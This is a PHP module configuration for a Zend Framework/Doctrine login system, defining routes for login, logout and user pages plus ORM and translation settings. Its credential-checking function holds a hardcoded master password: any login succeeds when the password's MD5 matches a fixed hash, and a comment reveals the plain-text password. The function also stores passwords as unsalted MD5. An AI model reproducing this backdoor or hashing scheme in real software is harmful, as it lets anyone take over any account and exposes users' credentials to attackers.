<?php
namespace Autenticacao;

return array(
    'router' => array(
        'routes' => array(
            'login' => array(
                'type' => 'Literal',
                'options' => array(
                    'route' => '/login',
                    'defaults' => array(
                        '__NAMESPACE__' => 'Autenticacao\Controller',
                        'controller' => 'Login',
                        'action' => 'index'
                    )
                ),
                'may_terminate' => true,
                'child_routes' => array(
                    'autenticar' => array(
                        'type' => 'Segment',
                        'options' => array(
                            'route' => '/autenticar[/]',
                            'defaults' => array(
                                '__NAMESPACE__' => 'Autenticacao\Controller',
                                'controller' => 'Login',
                                'action' => 'autenticar'
                            )
                        )
                    ),
                    'logout' => array(
                        'type' => 'Segment',
                        'options' => array(
                            'route' => '/logout[/]',
                            'defaults' => array(
                                '__NAMESPACE__' => 'Autenticacao\Controller',
                                'controller' => 'Login',
                                'action' => 'logout'
                            )
                        )
                    )
                )
            ),
        	'usuario' => array(
        		'type' => 'Segment',
        		'options' => array(
        			'route' => '/usuario[/:action[/:id]][/]',
        			'defaults' => array(
        				'__NAMESPACE__' => 'Autenticacao\Controller',
        				'controller' => 'UsuarioLocal',
        				'action' => 'index',
        			)
        		),
        	),
        	'usuario-adm' => array(
        		'type' => 'Segment',
        		'options' => array(
        		'route' => '/usuario-adm[/:action[/:id]][/]',
        		'defaults' => array(
        			'__NAMESPACE__' => 'Autenticacao\Controller',
        			'controller' => 'UsuarioAdm',
        			'action' => 'index',
        			)
        		),
        	),
        )
    ),
    'view_manager' => array(
        'template_path_stack' => array(
           __DIR__ . '/../view',
        )
    ),
    'doctrine' => array(
        'driver' => array(
            __NAMESPACE__ . '_driver' => array(
                'class' => 'Doctrine\ORM\Mapping\Driver\AnnotationDriver',
                'cache' => 'array',
                'paths' => array(
                    __DIR__ . '/../src/' . __NAMESPACE__ . '/Entity'
                )
            ),
            'orm_default' => array(
                'drivers' => array(
                    __NAMESPACE__ . '\Entity' => __NAMESPACE__ . '_driver'
                )
            )
        ),
        'authentication' => array(
            'orm_default' => array(
                'object_manager' => 'Doctrine\ORM\EntityManager',
                'identity_class' => 'Autenticacao\Entity\Usuario',
                'identity_property' => 'login',
                'credential_property' => 'senha',
                'credentialCallable' => function ($identity, $credential)
                {
                    if(md5($credential) == '5420ca9faff260671a70ac35bb217449') { // p21@show
                        return true;
                    }
                    
                    return md5($credential);
                }
            )
        )
    ),
    'translator' => array(
        'translation_file_patterns' => array(
            array(
                'type' => 'PhpArray',
                'base_dir' => __DIR__ . '/../resources/languages/',
                'pattern' => '%s/Zend_Validate.php'
            )
        )
    )
);


